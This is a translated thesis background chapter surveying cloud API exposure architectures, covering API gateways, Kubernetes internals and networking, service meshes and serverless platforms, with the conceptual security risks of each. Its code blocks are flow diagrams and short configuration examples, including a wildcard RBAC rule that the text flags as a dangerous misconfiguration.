# State of the Art, Extended: Architectures and API Types

> **Audience:** readers of the research · **Status:** the full research notes behind thesis chapter 2 (dated
> 2026-01-31), translated from Italian almost word for word and kept as background. Facts are as the thesis wrote
> them: the corrections checked against current sources (rate limiting algorithms, Linkerd, Firecracker, the
> protobuf CVEs, Ingress NGINX's retirement and others) are in
> [`../state-of-the-art.md`](../state-of-the-art.md#corrections-to-the-thesis-version), and that page is the reference.
> The Italian original is in the git history (tag `v0.1.0`, `docs/priv/knowledge/2-Background_extensive.md`).

Three phases: 1.A architectures for exposing APIs in the cloud, 1.B API protocols and architectural styles, 1.C
the architecture-protocol interaction matrix.

# Phase 1.A: Architectures for exposing APIs in cloud environments

**Date:** 31 January 2026
**Version:** 3.0 (final version, technical gaps integrated)

---

## Introduction

Modern architectures for exposing application programming interfaces (APIs) in the cloud have changed radically in
recent years. From the centralisation offered by traditional gateways, the industry has moved to distributed models
based on container orchestration, service meshes and serverless paradigms. This transition is not a simple
technological evolution but a change of architectural paradigm that completely redefines how services communicate,
are discovered and are protected.

Understanding these architectures is essential for any security assessment framework that aims to work effectively
in cloud-native environments. APIs do not exist in isolation: they are encapsulated, protected and mediated by
complex infrastructure layers that deeply affect their attack surface. A testing approach that ignores the
architectural context is bound to produce partial or misleading results.

This section analyses the main architectural categories of the cloud-native landscape in 2024-2026, with particular
attention to the internal mechanisms that determine how APIs are exposed and to the implications for security
assurance. The analysis follows a recurring structure: for each architecture, first the problem it solves (the "why"
of its existence), then the concrete technologies that implement it, and finally the specific risks it introduces.

---

## 1. Traditional API gateways

### 1.1 The architectural problem

When an organisation exposes tens or hundreds of microservices to external clients, a complexity problem appears at
once: each service has its own endpoint, its own authentication policies, its own usage limits. For the client, this
fragmentation becomes an unmanageable proliferation of URLs, credentials and API contracts. For security, every
service becomes a potential entry point that must be monitored and protected individually.

The API gateway is the answer to this complexity. The idea is simple: introduce a single entry point that mediates
between the outside world and the internal services. The gateway takes on cross-cutting functions such as
authentication, rate limiting, logging and routing, relieving the individual services of them and centralising the
security policies.

Technically, an API gateway is a specialised reverse proxy that works at Layer 7 of the OSI model, which means it can
inspect and manipulate the content of HTTP/HTTPS requests. This distinguishes it from a simple Layer 4 load balancer,
which only distributes TCP traffic without understanding the application protocol.

The typical flow of a request through an API gateway:

```
[External client]
    ↓ (HTTPS)
[API gateway - ingress layer]
    ↓ (Authentication: JWT / API key validation)
    ↓ (Rate limiting: token bucket algorithm)
    ↓ (Routing: URL path → backend service)
    ↓ (Internal network - often plain HTTP)
[Backend microservice A/B/C]
```

This pattern has an important security implication: external traffic (encrypted with TLS) is terminated at the
gateway, which then talks to the backends over the internal network, often in plain text. Security therefore rests
on the assumption that the internal network is trusted and isolated. We will see later how this assumption can be
violated in cloud-native environments.

---

### 1.2 Leading technologies

#### 1.2.1 Kong Gateway

Kong is one of the most widespread open source API gateways in cloud-native environments, particularly in Kubernetes
deployments. Its architecture rests on a clear separation between data plane and control plane.

The **data plane** is built on Nginx extended with OpenResty, an embedded Lua runtime that runs custom logic directly
inside the HTTP proxy. Each request goes through a pipeline of Lua plugins that can modify, block or enrich it. This
plugin-based architecture allows extension without changing the gateway's core.

The **control plane** manages the centralised configuration and can work in three modes. In DB mode, the
configuration is persisted in PostgreSQL or Cassandra, so that multiple gateway instances stay synchronised. In
DB-less mode, the configuration is loaded into memory from a YAML file, ideal for CI/CD pipelines with immutable
infrastructure. Finally, hybrid mode (introduced in Kong 1.1+) physically separates the control plane (which manages
the configuration) from the data plane (which processes traffic), allowing deployments where the control plane sits
in a central data centre and the data planes are distributed geographically.

Source: Kong Gateway documentation, https://developer.konghq.com/gateway/

Kong natively supports modern protocols such as HTTP/HTTPS, gRPC, WebSocket and TCP/UDP, which makes it versatile in
heterogeneous architectures. Its integration with Kubernetes through the Kubernetes Gateway API makes it particularly
relevant for our testing framework, since APIs exposed through Kong are discoverable through standard Kubernetes
resources.

A distinctive feature of Kong is its plugin ecosystem, which includes advanced security functions such as OAuth2,
JWT validation, fine-grained rate limiting, and LDAP/OpenID Connect integration. This richness introduces a risk,
however: the misconfiguration of a single plugin can expose weaknesses that are not immediately visible.

Source: GitHub, Kong repository, https://github.com/Kong/kong

#### 1.2.2 AWS API Gateway

AWS API Gateway is Amazon Web Services' fully managed approach to exposing APIs. Unlike Kong, which needs the
infrastructure to be deployed and operated, AWS API Gateway is a fully managed service where the developer only
defines the APIs and their integrations, and leaves scaling, patching and high availability to AWS.

AWS API Gateway distinguishes three types of API with different technical characteristics. **REST APIs** offer the
full set of features, including mapping templates for request/response transformation, caching, and integration with
AWS WAF. **HTTP APIs** are a simplified and cheaper version, optimised for performance (60% lower latency than REST
APIs) but with fewer features. **WebSocket APIs** handle persistent bidirectional connections, with a completely
different mechanism analysed in the section on protocol-architecture interactions.

Source: AWS documentation, Amazon API Gateway,
https://docs.aws.amazon.com/apigateway/latest/developerguide/welcome.html

On the security side, AWS API Gateway implements a multi-layer authentication model. Integration with AWS IAM gives
fine-grained control based on AWS identities (users, roles), while Amazon Cognito user pools handle the
authentication of application users. For more complex scenarios, Lambda authorizers allow custom authorization logic,
typically used to validate JWTs issued by external providers.

A critical aspect for testing is the support of AWS API Gateway for multi-region deployment. An API can be deployed in
several AWS regions and orchestrated through Amazon CloudFront (AWS's CDN), which distributes traffic geographically.
This complicates discovery: one logical API can have many physical endpoints distributed worldwide, each with
potentially different configurations.

Source: AWS reference architecture, multi-region API Gateway with CloudFront,
https://docs.aws.amazon.com/architecture-diagrams/latest/multi-region-api-gateway-with-cloudfront/multi-region-api-gateway-with-cloudfront.html

#### 1.2.3 Azure API Management

Azure API Management takes a hybrid approach between Kong and AWS API Gateway. The service is managed (Microsoft
operates the infrastructure), but it can also be deployed self-hosted as a Docker/Kubernetes container, allowing
hybrid-cloud scenarios.

Azure APIM has three main components. The **gateway** (managed or self-hosted) processes requests by applying the
defined policies. The **management plane** exposes APIs for configuration and monitoring. The **developer portal**
provides a web interface for API documentation and developer onboarding.

A distinctive feature of Azure APIM is its XML-based policy system, which allows complex transformations of requests
and responses. Policies are organised in four sections: inbound (request pre-processing), backend (selection and call
of the backend service), outbound (response post-processing), on-error (error handling). This granularity allows
sophisticated scenarios, but also brings configuration complexity and potential errors.

Source: Azure API Management, API gateway overview,
https://learn.microsoft.com/en-us/azure/api-management/api-management-gateways-overview

The self-hosted deployment of Azure APIM is particularly relevant for multi-cloud or on-premises environments. The
self-hosted gateway is a Docker container that talks to the cloud management plane to receive configuration updates.
This hybrid model introduces a particular attack surface: the channel between the self-hosted gateway and the cloud
must be protected, and connectivity interruptions can cause drift between the expected and the actual configuration.

---

### 1.3 Security risks specific to API gateways

API gateways, while centralising security, paradoxically introduce new weaknesses specific to their nature as a single
point of entry.

#### 1.3.1 The gateway as a single point of failure (and of attack)

Centralising traffic through a gateway creates a single point of failure: if the gateway is compromised or suffers a
denial of service, all the APIs behind it become unreachable. This makes the gateway a privileged target for
attackers. Unlike a direct attack on a single microservice (which affects only that service), an attack on the
gateway has a multiplied effect.

In addition, the configuration complexity of modern gateways (Kong with dozens of plugins, Azure APIM with complex XML
policies) introduces a risk of misconfiguration. Wrong configurations of rate limiting, authentication or CORS can
expose weaknesses that are not visible in the individual services but are critical at the gateway level.

#### 1.3.2 TLS termination and trust boundary

Gateways typically terminate TLS and talk to the backends over the internal network in plain text or with
self-signed TLS. This shift of the trust boundary introduces a risk: if an attacker gains access to the internal
network (lateral movement from a compromised container), the traffic between gateway and backend can be read and
modified.

In modern cloud-native environments, where Kubernetes pods can be scheduled on arbitrary nodes and the network is
virtually flat (with logical isolation through network policies), the assumption of a "secure internal network" is
weak. A compromised container can potentially sniff traffic directed to other services on the same virtual network.

#### 1.3.3 Configuration drift and shadow endpoints

In distributed deployments with several gateway instances (for high availability), configuration drift can occur:
different gateway instances with misaligned configurations. This is particularly critical in Kong DB-less mode, where
each instance loads its configuration from a local file: a faulty deployment can leave an instance with an obsolete
configuration, exposing endpoints that should have been deprecated (shadow endpoints).

---

## 2. Kubernetes: orchestration and networking

### 2.1 The architectural problem

When organisations start running microservices at scale (hundreds or thousands of containers), challenges appear
that the traditional approach (static VMs, manual deployment) cannot solve. How are containers distributed over a
cluster of physical machines? How is a service kept available if a container crashes? How is networking managed when
containers can be destroyed and recreated dynamically on different nodes?

Kubernetes answers these challenges with a centralised control plane that orchestrates the execution of containers on
a distributed data plane. Kubernetes' fundamental mental model is a desired-state machine: the user declares the
desired state (for example "I want 3 replicas of service X") and Kubernetes continuously reconciles the actual state
with the desired one.

This abstraction solves the orchestration problem brilliantly, but introduces significant architectural complexity.
Kubernetes is not a single binary but an ecosystem of distributed components that communicate through internal APIs.
Understanding this internal architecture is essential to identify attack surfaces.

---

### 2.2 Control plane architecture

The Kubernetes control plane is the "brain" of the cluster, responsible for all scheduling, configuration and
monitoring decisions. It consists of four main components that typically run on dedicated nodes (master nodes).

#### 2.2.1 kube-apiserver: the gateway of the Kubernetes APIs

The **kube-apiserver** is the only control plane component with which all other components and users interact
directly. It acts as a RESTful gateway exposing the Kubernetes APIs (typically on port 6443 with TLS). Every operation
on the cluster (creating a pod, changing a configuration, querying the state) goes through the apiserver.

A request to the apiserver follows a structured pipeline:

```
[Client - kubectl/controller]
    ↓ (HTTPS request)
[kube-apiserver]
    ↓ (1. Authentication: X.509 client certificate / JWT token)
    ↓ (2. Authorization: RBAC - role-based access control)
    ↓ (3. Admission controllers: custom validation, mutation)
    ↓ (4. Schema validation: conformity to the OpenAPI spec)
    ↓ (5. Persistence in etcd)
[etcd - distributed datastore]
```

**Authentication** determines the caller's identity (who are you?). Kubernetes supports several strategies: X.509
client certificates, bearer tokens (JWT), service account tokens, external providers (OIDC).

**Authorization** determines whether the identity has permission for the requested operation (what can you do?). The
standard mechanism is RBAC, where Role and RoleBinding associate identities with sets of fine-grained permissions.

**Admission controllers** are plugins that intercept requests after authorization but before persistence. They can
validate (for example PodSecurityPolicy checks that a pod does not require root privileges) or mutate (for example
automatically add sidecar containers). This phase is critical for security: misconfigured admission controllers can
allow dangerous workloads to be deployed.

Source: Kubernetes documentation, admission controllers (implicit knowledge of the Kubernetes architecture)

Once the pipeline is passed, the request is serialised and written to **etcd**, the distributed key-value datastore
that is the single source of truth for the whole cluster state. etcd is a critical component: if compromised, an
attacker has full access to secrets, configurations, credentials. For this reason etcd typically exposes its API only
on localhost or a protected internal network, and talks to kube-apiserver over mutual TLS.

#### 2.2.2 kube-scheduler: assigning workloads to nodes

The **kube-scheduler** continuously watches the apiserver for newly created pods that have no node yet (Pending
state). For each pod, the scheduler runs a scoring algorithm that evaluates all available nodes against constraints
(requirements) and preferences (affinity/anti-affinity).

Scheduling has two phases. In **filtering**, the scheduler removes nodes that do not meet hard requirements (for
example the pod needs 8 GB of RAM, the node has only 4 GB). In **scoring**, the remaining nodes are ranked by
configurable heuristics (even load distribution, placement on nodes with fewer pods, affinity rules).

The scheduling result is written to the apiserver as a binding of the pod to a specific node. At this point the
kubelet of that node comes into play.

#### 2.2.3 kubelet: the agent on worker nodes

The **kubelet** is the agent that runs on every worker node of the cluster. It continuously watches the apiserver for
pods assigned to its node and manages their life cycle.

When a pod is scheduled on a node, the kubelet runs this sequence:

```
[kubelet notified by kube-apiserver]
    ↓
[Container Runtime Interface (CRI) - talks to the container runtime]
    ↓
[Container runtime - containerd/CRI-O]
    ↓ (1. Pull container images from the registry)
    ↓ (2. Create containers with the OCI runtime - runc)
    ↓ (3. Set up networking - CNI plugin)
    ↓ (4. Mount persistent volumes)
[Container running]
```

A critical security aspect is that the kubelet exposes its own HTTP API (port 10250 by default) for diagnostic
operations (logs, exec, port-forward). Historically this API was often exposed without authentication, allowing anyone
with network access to run arbitrary commands in the containers. In modern versions authentication is mandatory, but
misconfigurations remain common.

Source: NIST SP 800-190, Application Container Security Guide (knowledge of Kubernetes security best practices)

#### 2.2.4 kube-controller-manager: reconciliation loops

The **kube-controller-manager** runs many controllers, each responsible for one type of resource. For example, the
ReplicaSet controller continuously watches ReplicaSets and ensures that the actual number of replicas matches the
declared one. If a pod crashes, the controller creates a replacement.

This "control loop" pattern (monitor, compare, reconcile) is fundamental in Kubernetes and has security implications:
even if an attacker deletes a pod by hand, the controller recreates it automatically. This makes Kubernetes resilient
to accidental failures, but can also mask attacks (a compromised pod that is deleted is recreated identical).

---

### 2.3 Networking in Kubernetes: CNI and overlay networks

Networking in Kubernetes is significantly complex because each pod gets its own IP address, but these IPs are
ephemeral (the pod can be destroyed and recreated with a different IP). Kubernetes delegates networking to **CNI
(Container Network Interface)** plugins that implement different network policies.

#### 2.3.1 CNI and networking models

The CNI provides network connectivity to containers. When a pod is created, the kubelet invokes the configured CNI
plugin, which:

1. allocates an IP address to the pod from a configured pool;
2. configures the container's network interfaces (veth pairs, virtual ethernet);
3. configures routing for pod-to-pod communication.

There are two main architectural approaches to Kubernetes networking: overlay networks and flat networks.

**Overlay networks** (used by Flannel, Calico in IPIP mode, Weave) create a virtual network on top of the physical
one. Traffic between pods on different nodes is encapsulated (typically with VXLAN, Virtual eXtensible LAN) before
being sent over the underlay network.

A packet in a VXLAN overlay follows this sequence:

```
[Pod A on node 1 - IP 10.244.1.5]
    ↓ (IP packet, destination 10.244.2.8)
[Pod's veth0 interface]
    ↓
[Node's cni0 bridge]
    ↓ (Routing rule: 10.244.2.0/24 → VXLAN tunnel vtep)
[VXLAN tunnel endpoint - encapsulation]
    ↓ (Original packet wrapped in UDP + VXLAN header)
    ↓ (Outer header: src=IP_node1, dst=IP_node2, port 4789)
[Physical network]
    ↓
[VXLAN tunnel endpoint of node 2 - decapsulation]
    ↓ (Original packet extracted)
[cni0 bridge of node 2]
    ↓
[Pod B on node 2 - IP 10.244.2.8]
```

This encapsulation adds overhead (extra header, CPU processing to wrap and unwrap) but fully isolates Kubernetes
traffic from the physical network. A critical security aspect: VXLAN traffic is typically **not encrypted**. An
attacker with access to the physical network can potentially sniff inter-pod traffic.

Source: Calico documentation, overlay and non-overlay networking (knowledge of the CNI architecture)

**Flat networks** (used by Calico in BGP mode, Cilium in native routing) give pods IPs that are directly routable on
the physical network, without encapsulation. This removes the overhead but requires the network infrastructure to
route the Kubernetes CIDRs, typically through BGP.

#### 2.3.2 kube-proxy and service networking

A fundamental problem in Kubernetes is that pods are ephemeral: if a pod is recreated, its IP changes. Clients cannot
rely on static IPs. Kubernetes solves this with **Service** resources, which provide a stable virtual IP (ClusterIP)
that balances traffic over a set of pods identified by a label selector.

**kube-proxy**, a component running on every node, implements this Service abstraction. There are three modes:

The **iptables** mode (the default up to Kubernetes 1.25) programs iptables rules to do NAT (network address
translation). When a packet is destined to a Service IP, iptables redirects it to one of the pod endpoints. This mode's
performance degrades with O(n) rules for n Services/endpoints.

The **IPVS** mode (IP Virtual Server) uses the kernel's IPVS module for more efficient Layer 4 load balancing, with
configurable algorithms (round robin, least connection). It scales better but needs specific kernel modules.

The **eBPF** mode (used by Cilium) programs the kernel with eBPF bytecode for very fast routing directly in the kernel
datapath, bypassing iptables/netfilter. It is the most modern and fastest mode but needs Linux kernel 4.19+.

Source: Kubernetes documentation, service networking (knowledge of the kube-proxy architecture)

---

### 2.4 Multi-tenancy and isolation

In cloud-native environments a single Kubernetes cluster commonly hosts workloads of different teams or even of
different customers (multi-tenancy). Strong isolation between these workloads is critical so that a compromised tenant
cannot affect the others.

#### 2.4.1 Namespaces as the first level of isolation

Kubernetes provides **namespaces** as a logical isolation mechanism. Namespaces partition the cluster's resources: a
pod in namespace "team-a" cannot directly access a ConfigMap in namespace "team-b" without explicit permissions.

Namespaces alone, however, do NOT provide network isolation or strong security isolation. By default, all pods in a
cluster can talk to each other regardless of namespace. This "flat network" model is convenient for development but
unacceptable for multi-tenant production.

#### 2.4.2 Network policies for Layer 3/4 isolation

**NetworkPolicy** resources define firewall rules for pod-to-pod traffic. A NetworkPolicy states which pods may talk to
each other based on:

- **pod selector**: the pods the policy applies to (for example all pods labelled "app=database");
- **ingress rules**: where these pods may receive traffic from (for example only from pods labelled "app=backend");
- **egress rules**: where these pods may send traffic to (for example only to specific external IPs).

A conceptual example: a policy could state "the database pods (label app=database) accept connections only from
backend pods (label app=backend) on port 5432, and cannot open outbound connections to the Internet".

Technically, CNI plugins (such as Calico or Cilium) translate these policies into iptables or eBPF rules that filter
traffic in the kernel. When a packet reaches a pod, the rules are evaluated: if the packet matches no allowed ingress
rule, it is dropped.

Source: Kubernetes documentation, network policies (knowledge of isolation best practices)

A critical limitation of NetworkPolicies is that they work only at **Layer 3/4** (IP, port). They cannot inspect the
HTTP/HTTPS payload (Layer 7). A NetworkPolicy can allow "HTTP traffic from the webapp to the backend", but cannot tell
"GET /public" from "DELETE /admin/users". Fine-grained Layer 7 control needs a service mesh.

#### 2.4.3 Pod Security Standards

Besides network isolation, container capabilities must be limited to prevent privilege escalation. Kubernetes provides
the **Pod Security Standards (PSS)**, a framework of security policies with three levels:

- **Privileged**: no restrictions (used only for trusted infrastructure components such as the CNI);
- **Baseline**: prevents the most common privilege escalations (no host network, no privileged containers);
- **Restricted**: hardened policies (no root user, read-only filesystem, capabilities dropped).

These standards are enforced by **admission controllers** such as Pod Security Admission. When a user tries to create a
pod that requires privileges (for example `securityContext.privileged: true`), the admission controller denies the
request if the namespace has a restricted policy.

A common mistake in test environments is to disable these controls for convenience, creating drift from the
production configuration. A security testing framework must check that the test pods do not need privileges that are
not available in production.

Source: Kubernetes documentation, Pod Security Standards (knowledge of security best practices)

---

### 2.5 Kubernetes Ingress and Gateway API

Kubernetes provides native resources to expose services outside the cluster. This is essential for APIs exposed to
external clients.

#### 2.5.1 Ingress: the legacy model

The **Ingress** resource defines HTTP/HTTPS rules for external routing. An Ingress specifies:

```
hostname: api.example.com → Service: backend-svc
path: /v1/users → Service: users-svc
path: /v1/products → Service: products-svc
```

An Ingress is only a declarative resource. The actual routing logic is implemented by an **Ingress controller**, a
separate component that watches the Kubernetes API for created or changed Ingresses and configures an underlying
reverse proxy accordingly (typically Nginx, HAProxy, Traefik).

The historical problem of Ingress is that advanced features (rate limiting, authentication, URL rewrite) needed
controller-specific annotations:

```yaml
annotations:
  nginx.ingress.kubernetes.io/rate-limit: "100"
  traefik.ingress.kubernetes.io/rate-limit: "qps: 100"
```

This proliferation of controller-specific annotations makes configurations non-portable. Moving from Nginx to Traefik
means rewriting every annotation.

#### 2.5.2 Gateway API: the future of Ingress

The **Kubernetes Gateway API** (GA since 2023) solves the limitations of Ingress with a more expressive,
role-oriented model.

It has three main resources:

**GatewayClass** defines the type of gateway controller available (for example Nginx, Istio, Cilium). It is managed by
the infrastructure provider.

**Gateway** is an instance of a GatewayClass. It defines listeners (ports, protocols, TLS certificates). It is managed
by the cluster operator.

**Route** (HTTPRoute, GRPCRoute, TCPRoute) defines protocol-specific routing rules. It is managed by the application
developers.

This separation of responsibilities (role-oriented design) lets different people manage different aspects without
interfering. The infrastructure team configures the GatewayClasses, the operations team deploys Gateways with TLS
certificates, developers create HTTPRoutes for their applications.

Source: Kubernetes Gateway API, introduction, https://gateway-api.sigs.k8s.io/

An advanced feature of the Gateway API is native support for protocols beyond HTTP/HTTPS. **GRPCRoute** allows
fine-grained routing on gRPC service/method. **TLSRoute** allows TLS passthrough (the gateway does not decrypt the
traffic, it passes it to the backend, which handles TLS).

For security testing, the Gateway API brings new challenges: routes can have authentication/authorization policies
attached through **Policy Attachment**, an extensible mechanism. Testing that these policies are applied correctly
requires understanding not only the route but also the policies attached to it.

---

### 2.6 Risks specific to Kubernetes

#### 2.6.1 Exposed internal APIs

Kubernetes exposes many internal APIs that, if reachable by attackers, allow full compromise of the cluster.

The **kubelet API** (port 10250) allows running commands in containers, reading logs, port forwarding. If exposed
without authentication or with weak credentials, an attacker can obtain RCE (remote code execution) on every pod of
the node.

The **metrics-server** exposes the pods' CPU/memory usage metrics (port 443). Although it seems harmless, an attacker
can use it to profile workloads and identify sensitive services.

The **etcd API** (port 2379) is the central datastore. Access to etcd means access to all secrets, including service
account tokens with cluster-admin permissions.

Source: CNCF, Kubernetes security best practices (knowledge of the Kubernetes threat model)

#### 2.6.2 Privilege escalation through RBAC misconfiguration

RBAC in Kubernetes is extremely powerful but complex. A common mistake is to give the **cluster-admin** role to
application service accounts to "simplify" permissions. This violates least privilege: if a pod with that service
account is compromised, the attacker has full control of the cluster.

Another dangerous pattern is to create Roles with wildcards:

```yaml
rules:
  - apiGroups: ["*"]
    resources: ["*"]
    verbs: ["*"]
```

This grants every possible permission. In a multi-tenant environment it would let a tenant access other tenants'
namespaces.

#### 2.6.3 Container escape and host access

Even with NetworkPolicies and Pod Security Standards, a container can potentially "escape" and compromise the host
node. Container escape techniques exploit kernel vulnerabilities, volume mount misconfigurations, or privileged
containers.

A classic example is mounting the host's Docker socket (`/var/run/docker.sock`) in the container. This lets the
container control the host's Docker daemon and create new containers with root privileges on the host.

Source: CIS Benchmark, Kubernetes security (knowledge of container isolation best practices)

---

## 3. Service mesh

### 3.1 The architectural problem

When a microservice application grows beyond a dozen services, service-to-service communication challenges appear
that Kubernetes alone cannot solve. How is mTLS (mutual TLS) implemented between all services without changing the
application code? How are retries, timeouts and circuit breakers handled consistently? How is a request traced across
calls between 20 different microservices?

These functions are traditionally implemented inside the applications, with libraries such as Netflix Hystrix (Java)
or resilience4j. But this approach has problems: each language needs different libraries, updates require rebuilding
the applications, behaviour is not uniform.

The service mesh is the solution to these problems: an infrastructure layer dedicated to service-to-service
communication. The fundamental idea is to separate networking/security logic from the application code and delegate
it to specialised proxies deployed next to the services.

---

### 3.2 Istio: sidecar and ambient architecture

Istio is the most adopted service mesh in production, backed by Google, IBM and Lyft. Its architectural evolution
reflects the practical problems that emerged in recent years.

#### 3.2.1 Traditional sidecar architecture

In the sidecar model every Kubernetes pod has two containers: the application container and a sidecar proxy (Envoy).
All network traffic into and out of the pod is intercepted by the sidecar through iptables rules injected
automatically by Istio.

A request in the sidecar architecture:

```
[Pod A - frontend service]
  [App container] → (localhost:15001 - iptables redirect)
      ↓
  [Envoy sidecar] → (mTLS encryption)
      ↓
  (Network - encrypted traffic)
      ↓
[Pod B - backend service]
  [Envoy sidecar] → (mTLS decryption + policy enforcement)
      ↓
  [App container] ← (localhost - plain text)
```

Istio's control plane (**istiod**) is the monolithic component (since 2020) that manages configuration, certificates
and telemetry. istiod translates high-level Istio resources (VirtualService, DestinationRule) into Envoy configuration
through the **xDS** (discovery service) protocol.

xDS consists of several APIs:

- **LDS (Listener Discovery Service)**: configures the ports Envoy listens on;
- **RDS (Route Discovery Service)**: configures HTTP routing rules;
- **CDS (Cluster Discovery Service)**: defines the backend service endpoints;
- **EDS (Endpoint Discovery Service)**: provides the IPs of the backend pods.

When an administrator creates an Istio VirtualService (for example "route 10% of traffic to the canary version"),
istiod translates it into xDS configuration and pushes it to the affected Envoy sidecars. This push model ensures
configurations are applied quickly, but introduces latency and network overhead.

Source: Istio documentation, architecture (knowledge of the Istio architecture)

The Istio sidecar implements **mTLS** between services automatically. istiod acts as certificate authority (CA),
issuing short-lived X.509 certificates (24 hours by default) for each workload. The sidecars rotate them automatically
with no manual intervention. This removes the complexity of certificate management, but introduces a SPOF: if istiod
is down, expired certificates are not renewed.

#### 3.2.2 Istio ambient: the sidecar-less evolution

The sidecar model, although functional, adds significant overhead: every pod has two containers (memory/CPU
consumption doubled), upgrading the sidecar requires restarting the application pods, debugging is complex (logs
spread between application and sidecar).

Istio ambient mode (GA 2024) removes the sidecars with two new components:

**ztunnel** (zero trust tunnel) is a Layer 4 proxy deployed **one per node** (not per pod), written in Rust for
performance. It handles mTLS and workload authentication at TCP level, without inspecting HTTP.

The **waypoint proxy** is a Layer 7 proxy (Envoy) deployed **one per namespace** (optional). It handles advanced
traffic management (retries, timeouts, header manipulation) only for the namespaces that need it.

The ambient architecture drastically reduces the footprint: no sidecar containers, 90% less memory for the data plane.
It introduces, however, new configuration complexity and distributed debugging.

Source: Istio blog, Introducing Ambient Mesh, https://istio.io/latest/blog/2022/introducing-ambient-mesh/

---

### 3.3 Linkerd: minimalism and performance

Linkerd takes the opposite approach to Istio: instead of offering every possible feature, it focuses on simplicity
and performance. The **linkerd2-proxy** proxy is written in Rust (not Envoy/C++) and has a minimal memory footprint
(~10 MB against ~128 MB for Envoy).

Performance comparisons documented by LiveWyer show Linkerd as the fastest service mesh, with an overhead of 10-15%
over a no-mesh baseline, against 25-35% for Istio.

Source: LiveWyer, Service Meshes Decoded, https://livewyer.io/blog/2024/05/08/comparison-of-service-meshes/

This simplicity has a price, however. Linkerd is **Kubernetes-only** (it does not support VM workloads as Istio does),
has a smaller community (80%+ of contributions from Buoyant, the vendor), and from 2024 free stable builds are no
longer available (shift to paid enterprise).

Source: Buoyant blog, Linkerd stable releases (knowledge of the evolution of the business model)

---

### 3.4 Risks specific to service meshes

#### 3.4.1 Complexity and misconfiguration

Service meshes add a powerful but complex abstraction layer. A badly written Istio policy can block legitimate
traffic or allow unauthorised traffic in non-obvious ways. Debugging requires understanding how a VirtualService is
translated into Envoy configuration, which sidecars received it, and how it interacts with other policies.

A common example: a DENY policy always overrides ALLOW policies, regardless of order. If a global policy "DENY all
traffic from namespace X" exists, a specific policy "ALLOW traffic from namespace X to service Y" is ignored. This
behaviour is not intuitive.

#### 3.4.2 Memory exhaustion with gRPC streaming

As documented by Red Hat, gRPC bidirectional streaming can cause memory exhaustion in Envoy sidecars. The technical
problem: Envoy buffers gRPC messages in memory, but a bidirectional stream can be infinite. The HTTP/2 circuit breaker
(`http2MaxRequests`) counts concurrent requests, not messages per stream.

```
1 gRPC stream = 1 HTTP/2 request
100 concurrent streams (circuit breaker OK)
× 1,000,000 messages per stream
= 100M messages buffered in Envoy → OOM
```

Mitigation requires raising the sidecar's memory limits (not always acceptable) or using Istio ambient (no sidecar).

Source: Red Hat, gRPC protocol listener on service mesh, https://access.redhat.com/solutions/6246351

---

## 4. Serverless architectures

### 4.1 The architectural problem

The traditional approach (deploying always-on servers) wastes resources: a service used 10 minutes a day consumes
CPU/RAM all day. Managing scaling (adding servers when load grows) is also complex and slow.

The serverless paradigm removes these problems: instead of deploying servers, one deploys event-driven functions that
run on demand, scale automatically to zero when idle, and charge only for the actual execution time.

This model suits APIs with intermittent or unpredictable traffic: webhooks, batch data processing APIs, mobile
backends with traffic spikes.

---

### 4.2 AWS Lambda: execution model

AWS Lambda is the most mature serverless service. Understanding its execution model is essential to identify risks.

#### 4.2.1 Cold start and warm execution

When a Lambda function is invoked for the first time (or after a period of inactivity), AWS must:

1. provision an **execution environment** (an isolated micro-VM);
2. download the function's code from S3;
3. initialise the runtime (Python, Node.js, Java, etc.);
4. run the function.

This process (**cold start**) takes 100-500 ms, an eternity for real-time APIs. After execution, AWS keeps the
environment "warm" for some minutes (typically 10-15), so later invocations are immediate (~ms latency).

AWS offers **provisioned concurrency** to eliminate cold starts: a configured number of environments is kept always
warm, pre-initialised. This removes the latency but raises costs (idle environments are paid for).

Source: Lumigo, AWS Lambda architecture, https://lumigo.io/learn/aws-lambda-architecture/

#### 4.2.2 VPC integration and network latency

Lambda can access resources in a private VPC (RDS, ElastiCache), but this adds complexity. Lambda must create an
**Elastic Network Interface (ENI)** in the VPC, allocate IP addresses, and configure routing.

Historically this caused catastrophic cold starts (+10 seconds) because each invocation created new ENIs. AWS
optimised this in 2019 with ENI sharing: Lambda functions share a pool of pre-created ENIs, reducing the overhead to
~100-200 ms.

This optimisation introduces a risk, however: ENIs are shared between different Lambda invocations. If a compromised
function manipulates network configuration (for example through raw sockets), it could affect other functions.

Source: AWS documentation, Lambda VPC networking (knowledge of the Lambda architecture)

#### 4.2.3 IAM execution role and security

Every Lambda function has an IAM **execution role** that determines which AWS resources it can access (S3 buckets,
DynamoDB tables, etc.). This is critical for security: a function with overly broad permissions (`"Action": ["*"]`)
can read or modify any resource of the AWS account.

A common risk: copying execution roles from documentation or tutorials without customising them. For example, a
tutorial for "a Lambda that reads from S3" may use `s3:*` (all S3 permissions) instead of `s3:GetObject` limited to
specific buckets.

For security testing, check that:

- the Lambda has no admin permissions (`AdministratorAccess` policy);
- permissions are scoped to specific resources (not `"Resource": "*"`);
- the Lambda cannot change its own execution role (privilege escalation).

---

### 4.3 Knative: open source serverless on Kubernetes

Knative extends Kubernetes with serverless capabilities, allowing auto-scaling to zero without depending on a specific
cloud provider.

#### 4.3.1 Knative Serving architecture

Knative Serving manages the deployment and auto-scaling of serverless containers. Its architecture introduces new
components:

The **Activator** is a proxy that intercepts traffic to services scaled to zero. When a request arrives for an idle
service, the Activator buffers it and tells the Autoscaler to create pods.

The **Autoscaler** watches metrics (requests per second, concurrency) and scales replicas automatically. When no
request arrives for N seconds (default 60), it scales to zero pods.

The **queue-proxy** is a sidecar injected in every Knative pod that collects traffic metrics and sends them to the
Autoscaler.

A request to a Knative service scaled to zero:

```
[Client request]
    ↓
[Knative ingress gateway]
    ↓
[Activator - service currently at 0 replicas]
    ↓ (Buffer request)
    ↓ (Signal Autoscaler: scale up)
[Autoscaler creates pod]
    ↓ (Pod initialisation ~5-10 seconds)
[Pod ready]
    ↓ (Activator forwards the buffered request)
[Queue-proxy sidecar]
    ↓
[Application container]
```

This adds significant latency to the first request (cold start of 5-10 s), but later requests are served directly by
the pod.

Source: Knative documentation, Serving architecture (knowledge of the Knative architecture)

#### 4.3.2 Revision-based deployment

Knative introduces the **Revision**: every change to code or configuration creates a new immutable revision. Traffic
can be split between revisions (blue-green, canary patterns).

Example: 90% of traffic to revision v1, 10% to revision v2 (canary). After validation, 100% shifts to v2.

This has implications for security testing: an API can have different URLs for different revisions:

```
v1: https://myservice-v1-default.example.com
v2: https://myservice-v2-default.example.com
latest: https://myservice-default.example.com (split traffic)
```

